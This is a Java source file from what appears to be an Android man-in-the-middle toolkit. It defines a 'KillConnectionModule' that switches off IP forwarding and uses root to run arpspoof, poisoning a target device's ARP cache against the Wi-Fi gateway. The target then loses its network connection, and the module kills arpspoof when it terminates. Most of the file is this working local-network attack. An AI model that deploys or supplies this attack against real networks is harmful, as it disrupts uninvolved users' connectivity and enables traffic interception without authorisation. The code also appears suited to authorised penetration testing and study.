package it.uniroma2.giadd.aitm.models.modules;

import android.content.Context;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;

import java.net.SocketException;
import java.util.List;

import it.uniroma2.giadd.aitm.R;
import it.uniroma2.giadd.aitm.managers.RootManager;
import it.uniroma2.giadd.aitm.interfaces.OnCommandListener;
import it.uniroma2.giadd.aitm.utils.NetworkUtils;

/**
 * Created by Alessandro Di Diego on 13/08/16.
 */

public class KillConnectionModule extends MitmModule implements Parcelable {

    private static final String TAG = KillConnectionModule.class.getName();
    private static final String ARP_SPOOF_COMMAND = "arpspoof -i <interface> -t <target> <default gateway>";

    public KillConnectionModule(Context context, String target, List<String> additionalCommands) throws SocketException {
        super(context, null, additionalCommands);
        moduleTitle = context.getString(R.string.module_killconnection_title);
        moduleMessage = context.getString(R.string.module_killconnection_message);

        // disable forwarding to block connection
        addKernelRoutingCommand(false);

        // spoof client connection to gateway
        String command = context.getFilesDir() + "/" + ARP_SPOOF_COMMAND;
        String interfaceName = NetworkUtils.getActiveInterface(context);
        if (interfaceName == null) {
            Log.e(TAG, "Unable to get interface name!");
            interfaceName = "wlan0";
        }
        command = command.replaceAll("<interface>", interfaceName);
        command = command.replaceAll("<target>", target);
        String gateway = NetworkUtils.getWifiGateway(context);
        if (gateway == null) {
            Log.e(TAG, "Unable to get wifi gateway!");
            gateway = "";
        }
        command = command.replaceAll("<default gateway>", gateway);
        commands.add(command);
    }

    @Override
    public void onModuleTermination(Context context) {
        super.onModuleTermination(context);
        RootManager.killByName(context, "arpspoof", RootManager.SIGINT, new OnCommandListener() {
            @Override
            public void onShellError(int exitCode) {
                Log.d(TAG, "ERROR: EXIT CODE:" + exitCode);
            }

            @Override
            public void onCommandResult(int commandCode, int exitCode) {
                Log.d(TAG, "Arpsoof terminated; EXIT CODE:" + exitCode);
                RootManager rootManager = new RootManager();
                rootManager.execSuCommandsAsync(getKernelRoutingCommands(false), 1, null);
            }

            @Override
            public void onLine(String line) {
                Log.d(TAG, "LINE: " + line);
            }
        });
    }


    @Override
    public int describeContents() {
        return 0;
    }

    @Override
    public void writeToParcel(Parcel dest, int flags) {
        super.writeToParcel(dest, flags);
    }

    protected KillConnectionModule(Parcel in) {
        super(in);
    }

    public static final Creator<KillConnectionModule> CREATOR = new Creator<KillConnectionModule>() {
        @Override
        public KillConnectionModule createFromParcel(Parcel source) {
            return new KillConnectionModule(source);
        }

        @Override
        public KillConnectionModule[] newArray(int size) {
            return new KillConnectionModule[size];
        }
    };
}
